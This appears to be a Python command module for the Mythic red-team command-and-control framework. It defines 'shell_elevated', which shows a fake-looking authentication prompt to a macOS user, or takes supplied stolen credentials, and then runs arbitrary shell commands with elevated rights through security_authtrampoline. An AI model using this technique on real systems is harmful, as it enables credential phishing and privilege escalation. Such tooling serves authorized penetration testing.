from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class ShellElevatedArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                type=ParameterType.String,
                description="Command to execute",
                parameter_group_info=[
                    ParameterGroupInfo(group_name="manual_creds"),
                    ParameterGroupInfo(group_name="prompt_creds")
                ]
            ),
            CommandParameter(
                name="user",
                type=ParameterType.Credential_JSON,
                parameter_group_info=[ParameterGroupInfo(group_name="manual_creds")]
            ),
            CommandParameter(
                name="credential",
                type=ParameterType.Credential_JSON,
                parameter_group_info=[ParameterGroupInfo(group_name="manual_creds")]
            ),
            CommandParameter(
                name="prompt",
                type=ParameterType.String,
                description="What prompt to display to the user when asking for creds",
                parameter_group_info=[
                    ParameterGroupInfo(group_name="prompt_creds")
                ]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply arguments")
        raise ValueError("Must supply named arguments or use the modal")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class ShellElevatedCommand(CommandBase):
    cmd = "shell_elevated"
    needs_admin = False
    help_cmd = "shell_elevated"
    description = """
    The command will pop a dialog box for the user asking for them to authenticate (fingerprint reader too) so that the command you entered will be executed in an elevated context. Alternatively, you can supply a username and password and the command will run under their context (assuming they have the right permissions). Once you successfully authenticate, you have a time window where no more popups will occur, but you'll still execute subsequent commands in an elevated context.

WARNING! THIS IS SINGLE THREADED, IF YOUR COMMAND HANGS, THE AGENT HANGS!
    """
    version = 1
    author = "@its_a_feature_"
    attackmapping = ["T1059", "T1059.004", "T1548.004"]
    argument_class = ShellElevatedArguments

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage="/usr/libexec/security_authtrampoline /System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid auth 15 /System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid /bin/sh -c {}".format(taskData.args.get_arg("command")),
            BaseArtifactType="Process Create"
        ))
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage="/System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid /System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid /bin/sh -c {}".format(taskData.args.get_arg("command")),
            BaseArtifactType="Process Create"
        ))
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage="/System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid /bin/sh -c {}".format(taskData.args.get_arg("command")),
            BaseArtifactType="Process Create"
        ))
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage="/System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid /bin/sh -c {}".format(taskData.args.get_arg("command")),
            BaseArtifactType="Process Create"
        ))
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage="/bin/sh -c {}".format(taskData.args.get_arg("command")),
            BaseArtifactType="Process Create"
        ))
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage="{}".format(taskData.args.get_arg("command")),
            BaseArtifactType="Process Create"
        ))
        if taskData.args.get_parameter_group_name() == "manual_creds":
            taskData.args.add_arg("user", taskData.args.get_arg("user")["account"])
            taskData.args.add_arg("credential", taskData.args.get_arg("credential")["credential"])
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
